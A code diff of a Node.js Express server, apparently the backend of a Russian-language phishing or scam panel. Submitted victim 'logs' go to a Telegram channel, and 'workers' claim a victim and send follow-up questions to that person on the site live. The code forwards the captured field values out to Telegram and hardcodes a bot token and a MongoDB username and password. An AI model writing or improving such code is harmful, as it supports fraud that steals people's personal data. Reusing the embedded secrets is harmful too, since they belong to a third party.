@@ -1,6 +1,6 @@
 const express = require('express');
 const axios = require('axios');
-const mongoose = require('mongoose'); // Подключаем базу
+const mongoose = require('mongoose');
 const app = express();
 
 app.use(express.json());
@@ -9,7 +9,6 @@ app.use(express.static('public'));
 // --- КОНФИГУРАЦИЯ ---
 const BOT_TOKEN = '8003392137:AAFbnbKyLJS6N1EdYSxtRhR9n5n4eJFpBbw';
 const CHANNEL_ID = '-1003455979409';
-// Твоя ссылка, которую мы создали ранее
 const MONGO_URI = 'mongodb+srv://multmoment27_db_user:tgLoUlcEPVjsnZgb@cluster0.vzajrjd.mongodb.net/?retryWrites=true&w=majority'; 
 
 // --- ПОДКЛЮЧЕНИЕ К БАЗЕ ---
@@ -17,10 +16,9 @@ mongoose.connect(MONGO_URI)
     .then(() => console.log('✅ База данных подключена'))
     .catch(err => console.error('❌ Ошибка базы:', err));
 
-// Схема для хранения связки Воркер <-> Юзер
 const WorkerSchema = new mongoose.Schema({
-    workerId: String,      // ID админа в Telegram
-    targetUserId: String   // ID лога (юзера на сайте)
+    workerId: String,      
+    targetUserId: String   
 });
 const Worker = mongoose.model('Worker', WorkerSchema);
 
@@ -46,25 +44,29 @@ app.post('/api/log', async (req, res) => {
 
     logsStorage[userId] = { type, data, time: new Date().toLocaleTimeString() };
 
-    // Ищем воркера в БАЗЕ ДАННЫХ по userId
+    // Ищем воркера в БАЗЕ по userId
     const connection = await Worker.findOne({ targetUserId: userId });
 
-    // Если воркер найден — шлем ему в ЛС
+    // --- ЛОГИКА ДЛЯ ПОВТОРЯЮЩЕГОСЯ ЛОГА ---
     if (connection) {
-        let replyMsg = `<b>📩 ПОЛУЧЕН ОТВЕТ [<code>${userId}</code>]</b>\n\n`;
-        for (let key in data) { replyMsg += `<b>${key}:</b> <code>${data[key]}</code>\n`; }
+        let repeatMsg = `<b>⚠️ ПОВТОРЯЮЩИЙСЯ ЛОГ [<code>${userId}</code>]</b>\n`;
+        repeatMsg += `<b>Тип:</b> ${safeText(type)}\n\n`;
+        
+        for (let key in data) { 
+            repeatMsg += `<b>${key}:</b> <code>${data[key]}</code>\n`; 
+        }
         
         await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
             chat_id: connection.workerId,
-            text: replyMsg,
+            text: repeatMsg,
             parse_mode: 'HTML'
-        }).catch(e => console.log("Ошибка отправки воркеру в ЛС"));
+        }).catch(e => console.log("Ошибка отправки повторного лога"));
         
         return res.json({ success: true });
     } 
 
-    // Если воркера нет — шлем в канал
-    let channelMsg = `<b>🆕 НОВЫЙ ЛОГ [${safeText(type)}]</b>\n🆔 ID: <code>${safeText(userId)}</code>\n📍 Статус: 🔵 Ожидает...`;
+    // Если воркера нет (новый лог) — шлем в канал
+    let channelMsg = `<b>🆕 НОВЫЙ ЛОГ [${safeText(type)}]</b>\n🆔 ID: <code>${safeText(userId)}</code>\n📍 Статус: 🔵 Ожидает воркера...`;
 
     await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
         chat_id: CHANNEL_ID,
@@ -96,15 +98,12 @@ app.post('/tg-webhook', async (req, res) => {
                 await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     chat_id: chatId, text: "<b>👋 Бот готов!</b>", parse_mode: 'HTML'
                 });
-            } 
-            else {
-                // Ищем в базе, за каким юзером закреплен этот воркер
+            } else {
                 const conn = await Worker.findOne({ workerId: chatId });
                 if (conn) {
-                    const targetUserId = conn.targetUserId;
-                    userTasks[targetUserId] = { action: 'ask', text: message.text };
+                    userTasks[conn.targetUserId] = { action: 'ask', text: message.text };
                     await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                        chat_id: chatId, text: `✅ Отправлено пользователю <code>${targetUserId}</code>`, parse_mode: 'HTML'
+                        chat_id: chatId, text: `✅ Отправлено пользователю <code>${conn.targetUserId}</code>`, parse_mode: 'HTML'
                     });
                 }
             }
@@ -119,7 +118,6 @@ app.post('/tg-webhook', async (req, res) => {
             }).catch(() => {});
 
             if (action === 'take') {
-                // СОХРАНЯЕМ В БАЗУ: теперь этот воркер ведет этого юзера
                 await Worker.findOneAndUpdate(
                     { workerId: workerId }, 
                     { targetUserId: userId }, 
@@ -165,7 +163,6 @@ app.post('/tg-webhook', async (req, res) => {
             }
         }
     } catch (e) { console.error("Webhook Error:", e.message); }
-    
     res.sendStatus(200);
 });
 
